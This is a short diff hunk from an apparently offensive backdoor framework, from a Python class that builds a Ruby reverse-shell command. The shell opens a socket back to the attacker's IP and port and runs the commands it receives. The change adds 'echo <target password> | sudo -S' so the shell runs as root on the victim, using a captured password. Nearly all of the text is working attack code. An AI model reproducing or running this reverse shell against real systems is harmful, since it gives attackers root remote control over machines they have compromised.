@@ -16,7 +16,7 @@ class Ruby(Backdoor):
 		self.help_text = INFO + "Uses ruby to open a socket and redirect I/O to /bin/sh."
 
 	def get_command(self):
-		command = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + self.core.localIP + "\",\"" + str(self.get_value("port")) + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){ |io| c.print io.read } end'"
+		command = "echo " + self.core.curtarget.pword + " | sudo -S ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + self.core.localIP + "\",\"" + str(self.get_value("port")) + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){ |io| c.print io.read } end'"
 		print(command)
 		return command
 
